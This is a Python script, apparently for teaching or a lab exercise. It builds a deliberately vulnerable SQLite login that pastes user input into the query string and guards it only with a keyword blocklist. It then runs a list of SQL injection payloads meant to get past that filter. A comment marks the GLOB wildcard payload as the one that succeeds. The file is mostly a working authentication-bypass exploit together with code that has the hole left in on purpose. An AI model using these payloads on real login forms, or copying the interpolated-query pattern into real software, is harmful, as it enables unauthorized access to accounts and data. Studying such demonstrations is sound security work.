import sqlite3
import re

def validate_input(input_str: str, filter_keywords: list) -> bool:
    """
    Validate input by checking for forbidden keywords.
    
    Args:
        input_str (str): The input string to validate
        filter_keywords (list): List of keywords to filter
    
    Returns:
        bool: True if input is valid, False otherwise
    """
    # Convert input to lowercase for case-insensitive matching
    input_lower = input_str.lower()
    
    # Create a regex pattern to match whole words
    pattern = r'\b(' + '|'.join(re.escape(keyword.lower()) for keyword in filter_keywords) + r')\b'
    
    # Check for matches
    match = re.search(pattern, input_lower)
    if match:
        print(f"Forbidden keyword detected: {match.group()}")
        return False
    
    return True

def vulnerable_login(username: str, password: str) -> list:
    """
    A vulnerable login function with keyword filtering
    """
    # Define filter keywords
    filter_keywords = [
        "or", "and", "true", "false", "union", "like", 
        "=", ">", "<", ";", "--", "/*", "*/", "admin"
    ]

    connection = None
    
    try:
        # Validate inputs first
        if not validate_input(username, filter_keywords):
            print("Username contains forbidden keywords!")
            return []
        
        if not validate_input(password, filter_keywords):
            print("Password contains forbidden keywords!")
            return []
        
        # Establish database connection
        connection = sqlite3.connect("vulnerable.db")
        cursor = connection.cursor()
        
        # Direct string interpolation - still vulnerable!
        query = f"SELECT username, role FROM users WHERE username = '{username}' AND password = '{password}'"
        
        print(f"Executing query: {query}")
        
        cursor.execute(query)
        results = cursor.fetchall()
        return results
    
    except sqlite3.Error as e:
        print(f"Database error: {e}")
        return []
    finally:
        if connection:
            connection.close()

def create_vulnerable_database():
    """Create a sample database for SQLi demonstration"""
    connection = sqlite3.connect("vulnerable.db")
    cursor = connection.cursor()
    
    # Create a users table with some sample data
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            role TEXT
        )
    ''')
    
    # Insert some sample users
    sample_users = [
        (1, 'alice', 'password123', 'user'),
        (2, 'bob', 'securepass', 'user'),
        (3, 'administrator', 'admin_secret', 'admin')
    ]
    
    cursor.executemany('''
        INSERT OR REPLACE INTO users (id, username, password, role) 
        VALUES (?, ?, ?, ?)
    ''', sample_users)
    
    connection.commit()
    connection.close()

def demonstrate_sqli():
    """Demonstrate SQL injection techniques with keyword filtering"""
    # Create the vulnerable database first
    create_vulnerable_database()
    
    print("SQL Injection Demonstration:\n")
    
    # Injection attempts that try to bypass keyword filtering
    injection_attempts = [
        # THIS CAN'T WORK BECAUSE OF THE FILTER KEYWORDS
        # 1. Classic Authentication Bypass
        {"username": "admin'--", "password": "anything"},
        
        # 2. Complex Bypass using OR
        {"username": "admin' OR '1'='1", "password": "anything' OR '1'='1"},

        # 3. Bypassing 'admin' filter
        {"username": "adm1n", "password": "anything"},
        
        # 4. Alternative concatenation
        {"username": "administrator", "password": "'||''"},
        
        # 5. Payload with modified keywords
        {"username": "alice'x0r1=1", "password": "pass'x0r2=2"},
        
        # 6. Unicode or alternative representation tricks
        {"username": "admin\u200b", "password": "password"},
        
        # 7. Attempting to break filter with unusual characters
        {"username": "a' GLOB '*", "password": "a' GLOB '*"}, # Só esta é que passa

        {"username": "adm'||'in", "password": "' glob '*"},
    ]
    
    print("Attempting Injections:\n")
    for attempt in injection_attempts:
        print(f"Username: {attempt['username']}")
        print(f"Password: {attempt['password']}")
        
        results = vulnerable_login(attempt['username'], attempt['password'])
        
        if results:
            print("Successful injection! Retrieved users:")
            for user in results:
                print(f"Username: {user[0]}, Role: {user[1]}")
        else:
            print("Injection attempt failed")
        print("\n" + "-"*40 + "\n")

# Run the demonstration
if __name__ == "__main__":
    demonstrate_sqli()